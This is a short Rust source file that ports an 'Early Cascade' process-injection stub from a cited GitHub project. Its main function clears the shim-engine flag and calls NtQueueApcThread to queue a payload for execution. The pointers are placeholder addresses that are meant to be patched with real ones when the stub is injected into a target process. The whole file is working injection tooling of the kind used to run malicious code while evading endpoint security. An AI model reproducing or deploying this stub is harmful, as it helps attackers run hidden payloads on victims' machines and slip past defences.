#![allow(non_snake_case)]
use std::{mem::transmute, os::raw::c_void, ptr::null_mut};

/*
https://github.com/Cracked5pider/earlycascade-injection/blob/main/stub/src/Main.cc
*/

type NtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: *mut c_void,
    ApcRoutine: *mut c_void,
    ApcArgument1: *mut c_void,
    ApcArgument2: *mut c_void,
    ApcArgument3: *mut c_void,
) -> i32;

fn main() {
    let g_shims_enabled: *mut u8 = 0x9999999999999999 as *mut u8;
    let mm_payload: *mut c_void = 0x8888888888888888 as *mut c_void;
    let mm_context: *mut c_void = 0x7777777777777777 as *mut c_void;

    unsafe {
        *g_shims_enabled = 0;
    }

    let NtQueueApcThread: NtQueueApcThread = unsafe { transmute(0x6666666666666666u64) };

    unsafe {
        NtQueueApcThread(
            (-2isize) as *mut c_void,
            mm_payload,
            mm_context,
            null_mut(),
            null_mut(),
        );
    }
}
